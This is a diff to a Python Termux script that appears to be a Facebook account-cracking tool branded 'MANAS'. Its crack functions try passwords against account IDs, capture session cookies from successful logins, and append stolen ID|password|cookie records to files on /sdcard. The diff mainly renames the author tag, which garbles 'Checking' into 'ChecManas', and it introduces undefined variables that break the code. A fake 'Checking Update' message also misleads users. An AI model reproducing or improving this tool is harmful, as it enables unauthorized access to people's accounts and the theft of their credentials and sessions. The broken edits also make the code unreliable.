@@ -14,15 +14,15 @@ from time import localtime as lt
 pretty.install()
 CON=sol()
 os.system("pkg install espeak")
- #------------------[ MANAS-King ]-------------------#
+ #------------------[ MANAS-Manas ]-------------------#
 import os, platform, time, sys
-print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mChecking Update...? ')
+print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mChecManas Update...? ')
 time.sleep(5)
 os.system('clear')
 print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mUpdate Done ✅")
 time.sleep(2)
 #os.system(f'xdg-open https://facebook.com/groups/554714119911648/')
-#------------------[ MANAS-King ]-------------------#
+#------------------[ MANAS-Manas ]-------------------#
 #------------------[ USER-AGENT ]-------------------#
 ua = ["Mozilla/5.0 (Linux; Android 8.0.0; LLD-AL20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36",]
 ua = ["Mozilla/5.0 (Linux; Android 8.0.0; SM-J600GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Mobile Safari/537.36",]
@@ -209,7 +209,7 @@ def clear():
 def back():
     login()
 def contact():
-   # os.system('xdg-open https://www.facebook.com/MANAS.King.Ok.Bro')
+   # os.system('xdg-open https://www.facebook.com/MANAS.Manas.Ok.Bro')
     back()
 def linex():
     print('\033[1;37m')
@@ -488,7 +488,7 @@ def dump_massal():
 def crack_file():
     print('\033[0;91m==================')
     os.system('espeak -a 300 " your file name"')
-    print('\033[1;32m[ Put File Example:  /sdcard/king.txt  Etc...]')
+    print('\033[1;32m[ Put File Example:  /sdcard/Manas.txt  Etc...]')
     o = input('\033[97;1m[\033[92;1m+\033[97;1m] INPut FILE NAME :\033[92;1m ')
     try:lin = open(o).read().splitlines()
     except:
@@ -535,7 +535,7 @@ def setting():
     print("\033[97;1m[\033[92;1m2\033[97;1m] METHOD 2 [\033[0;93mCp id Show\033[1;37m]")
     print('\033[0;91m==================')
     hc = input('\033[97;1m[\033[92;1m•\033[97;1m] CHOOSE : ')
-    #os.system("xdg-open https://www.facebook.com/MANAS.King.Ok.Bro")
+    #os.system("xdg-open https://www.facebook.com/MANAS.Manas.Ok.Bro")
     if hc in ['1','01']:
         method.append('mobile')
     elif hc in ['2','02']:
@@ -652,7 +652,7 @@ def crack(idf,pwv):
             if "checkpoint" in po.cookies.get_dict().keys():
                # print(f#'\r\033[0;94m[MANAS-Cp] {idf} • {pw}')
                 #os.system#('espeak -a 300 " Cp,"')
-                open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+                open('/sdcard/MANAS-CP.txt','a').write(ids+'|'+pas+'\n')
                 akun.append(idf+' | '+pw)
                 cp+=1
                 break
@@ -662,7 +662,7 @@ def crack(idf,pwv):
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                 print(f'\r\033[0;92m[MANAS-Ok] {idf} | {pw}\n\033[0;93m[❤️]= COOKIES • \033[0;92m{kuki} ')
                #$ os.system(#espeak -a 300 " MANAS,  Ok,  id"')
-                open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+                open('/sdcard/MANAS-OK.txt','a').write(uid+'|'+pas+'|'+kuki+'\n')
                 break
                 
             else:
@@ -694,7 +694,7 @@ def crackfree(idf,pwv):
             if "checkpoint" in po.cookies.get_dict().keys():
                # print(f#'\r\033[0;95m[{time.strftime("%H:%M")}•MANAS-Cp] {idf} • {pw}')
                # os.system#('espeak -a 300 " Cp,"')
-                open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+                open('/sdcard/MANAS-CP.txt','a').write(ids+'|'+pas+'\n')
                 akun.append(idf+' • '+pw)
                 cp+=1
                 break
@@ -704,7 +704,7 @@ def crackfree(idf,pwv):
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                 print(f'\r\033[10;92m[{time.strftime("%H:%M")}•MANAS-Ok] {idf} | {pw} ')
                 #os.system#('espeak -a 300 " Ok,  MANAS,  id"')
-                open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+                open('/sdcard/MANAS-OK.txt','a').write(uid+'|'+pas+'|'+kuki+'\n')
                 break
                 
             else:
